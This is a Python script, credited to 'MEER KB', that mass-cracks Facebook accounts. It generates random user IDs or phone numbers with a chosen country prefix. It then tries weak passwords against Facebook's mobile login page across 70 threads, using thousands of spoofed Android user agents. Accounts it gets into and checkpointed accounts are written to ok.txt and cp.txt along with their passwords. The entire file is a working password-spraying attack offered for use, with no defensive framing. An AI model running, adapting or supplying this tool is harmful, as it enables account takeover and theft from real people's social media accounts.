#coding=utf 
#tool by Alienrazor 
import os, sys, time, json, random, re, string, platform, base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError: 
     os.system('pip install mechanize requests futures==2 > /dev/null') 
     os.system('python MEER.py')


ugen = []
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)



    
logo = """    
      

 #     # ####### ####### ######     #    # ######  
 ##   ## #       #       #     #    #   #  #     # 
 # # # # #       #       #     #    #  #   #     # 
 #  #  # #####   #####   ######     ###    ######  
 #     # #       #       #   #      #  #   #     # 
 #     # #       #       #    #     #   #  #     # 
 #     # ####### ####### #     #    #    # ######  
                                                   

--------------------------------------------------
   Author  :  MEER KB
   Github  :  MEER KB
   Tool    :  Random
   Contact :  +923103724344
--------------------------------------------------""" 
loop = 0 
oks = [] 
cps = [] 

 #global functions 
def dynamic(text): 
     titik = ['.   ','..  ','... ','.... '] 
     for o in titik: 
         print('\r'+text+o), 
         sys.stdout.flush();time.sleep(1) 
  
def main(): 
     os.system('clear') 
     print(logo) 
     print('[1] Random crack') 
     print(50*'-') 
     opt = input('Choose option >>> ') 
     if opt =='1': 
         random_crack() 
     else: 
         print('\n\033[1;31mChoose valid option\033[0;97m') 
def random_crack(): 
     os.system('clear') 
     print(logo) 
     print('[1] Random UID crack') 
     print('[2] Random number crack') 
     print('[B] Back') 
     print(50*'-') 
     opt = input('Choose option >>> ') 
     if opt =='1': 
         random_uid() 
     elif opt =='2': 
         random_number() 
     elif opt =='3': 
         main() 
     else: 
         print('\n\033[1;31mChoose valid option\033[0;97m') 
def random_uid(): 
     user=[] 
     os.system('clear') 
     print(logo) 
     limit = int(input('How many ids do you want to add ? ')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(11)) 
         user.append('10000'+nmp) 
     print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m') 
     pwx = input('Put passwords: ').split(',') 
     with ThreadPool(max_workers=70) as yaari: 
         os.system('clear') 
         print(logo) 
         tl = str(len(user)) 
         print('Total ids: '+tl) 
         print('The process has been started') 
         print(50*'-') 
         for uid in user: 
             yaari.submit(rcrack,uid,pwx,tl) 
     print(50*'-') 
     print('Crack process has been completed') 
     print('Ids saved in ok.txt,cp.txt') 
     print(50*'-') 
def random_number(): 
     user=[] 
     os.system('clear') 
     print(logo) 
     print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m') 
     kode = input('Put code: ') 
     limit = int(input('How many numbers do you want to add ? ')) 
     for nmbr in range(limit): 
         nmp = ''.join(random.choice(string.digits) for _ in range(7)) 
         user.append(nmp) 
     with ThreadPool(max_workers=70) as yaari: 
         os.system('clear') 
         print(logo) 
         tl = str(len(user)) 
         print('Total ids: '+tl) 
         print('The process has been started') 
         print(50*'-') 
         for guru in user: 
             uid = kode+guru 
             pwx = [guru] 
             yaari.submit(rcrack,uid,pwx,tl) 
     print(50*'-') 
     print('Crack process has been completed') 
     print('Ids saved in ok.txt,cp.txt') 
     print(50*'-') 

def rcrack(uid,pwx,tl): 
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en-AU;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    # 'cookie': 'locale=en_US; vpd=v1%3B642x412x1.75; datr=zHX8Y6FMwe4xk_mARMPdkCkz; sb=zHX8Y09NLRS67pzE8TNfrBYM; m_pixel_ratio=1.75; wd=412x734; fr=0W6dwgUIRN0cQhmkv..Bj_HXM.Fc.AAA.0.0.Bj_HXT.AWVQgaK6ilE',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Google Chrome";v="94", "Chromium";v="94", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys() 
             #print(iid+'|'+pws+'|'+str(log_cookies)) 
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22] 
                print('\033[1;32m[MEER-OK] '+cid+' | '+ps+'\033[0;97m') 
                open('ok.txt', 'a').write(cid+' | '+ps+'\n') 
                oks.append(cid) 
                break 
            elif 'checkpoint' in log_cookies: 
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]) 
                cid = coki[24:39] 
                print('\033[1;31m[MEER-CP] '+cid+' | '+ps+'\033[0;97m') 
                open('cp.txt', 'a').write(cid+' | '+ps+'\n') 
                cps.append(cid) 
                break 
            else: 
                continue 
        loop+=1 
        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))), 
        sys.stdout.flush() 
    except: 
            pass 
 

main()